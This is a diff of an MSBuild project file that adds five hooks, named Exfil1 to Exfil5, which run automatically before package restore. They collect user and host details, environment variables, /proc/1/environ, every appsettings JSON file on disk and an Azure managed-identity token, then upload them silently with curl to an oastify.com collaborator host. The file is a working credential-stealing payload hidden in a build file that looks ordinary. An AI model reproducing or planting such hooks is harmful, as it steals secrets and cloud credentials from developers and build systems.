@@ -4,30 +4,42 @@
     <TargetFramework>net472</TargetFramework>
   </PropertyGroup>
 
-  <!-- Confirmed working — keep as anchor -->
+  <!-- Confirmed working anchor -->
   <Target Name="Exfil1" BeforeTargets="Restore">
-    <Exec Command="curl -s http://COLLAB_DOMAIN/ctx/`whoami`/`hostname`/`id`" />
+    <Exec Command="curl -s http://fgz62g1erw27384legpal6o7uy0pohc6.oastify.com/ctx/`whoami`/`hostname`/`id`"
+          ContinueOnError="true" />
   </Target>
 
-  <!-- Env dump — split into smaller curls to avoid length issues -->
+  <!-- env dump: write to file, curl the file -->
   <Target Name="Exfil2" BeforeTargets="Restore">
-    <Exec Command="env | base64 | curl -s -T - http://COLLAB_DOMAIN/env-dump" />
+    <Exec Command="sh -c 'env > /tmp/e2.txt'"
+          ContinueOnError="true" />
+    <Exec Command="curl -s -F f=@/tmp/e2.txt http://fgz62g1erw27384legpal6o7uy0pohc6.oastify.com/env-dump"
+          ContinueOnError="true" />
   </Target>
 
-  <!-- /proc/1/environ — init process, often has injected Azure secrets -->
+  <!-- /proc/1/environ -->
   <Target Name="Exfil3" BeforeTargets="Restore">
-    <Exec Command="cat /proc/1/environ | tr '\0' '\n' | base64 | curl -s -T - http://COLLAB_DOMAIN/proc1env" />
+    <Exec Command="sh -c 'cat /proc/1/environ | tr &apos;\0&apos; &apos;\n&apos; > /tmp/e3.txt'"
+          ContinueOnError="true" />
+    <Exec Command="curl -s -F f=@/tmp/e3.txt http://fgz62g1erw27384legpal6o7uy0pohc6.oastify.com/proc1env"
+          ContinueOnError="true" />
   </Target>
 
-  <!-- appsettings files -->
+  <!-- appsettings.json files -->
   <Target Name="Exfil4" BeforeTargets="Restore">
-    <Exec Command="find / -name 'appsettings*.json' 2>/dev/null | xargs cat 2>/dev/null | base64 | curl -s -T - http://COLLAB_DOMAIN/appsettings" />
+    <Exec Command="sh -c 'find / -name appsettings*.json 2>/dev/null | xargs cat 2>/dev/null > /tmp/e4.txt'"
+          ContinueOnError="true" />
+    <Exec Command="curl -s -F f=@/tmp/e4.txt http://fgz62g1erw27384legpal6o7uy0pohc6.oastify.com/appsettings"
+          ContinueOnError="true" />
   </Target>
 
-  <!-- IMDS managed identity token -->
+  <!-- Azure IMDS managed identity token -->
   <Target Name="Exfil5" BeforeTargets="Restore">
-    <Exec Command="curl -sf -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/' | base64 | curl -s -T - http://COLLAB_DOMAIN/imds-token" />
+    <Exec Command="sh -c 'curl -sf -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/ > /tmp/e5.txt 2>/dev/null'"
+          ContinueOnError="true" />
+    <Exec Command="curl -s -F f=@/tmp/e5.txt http://fgz62g1erw27384legpal6o7uy0pohc6.oastify.com/imds-token"
+          ContinueOnError="true" />
   </Target>
-
 
 </Project>
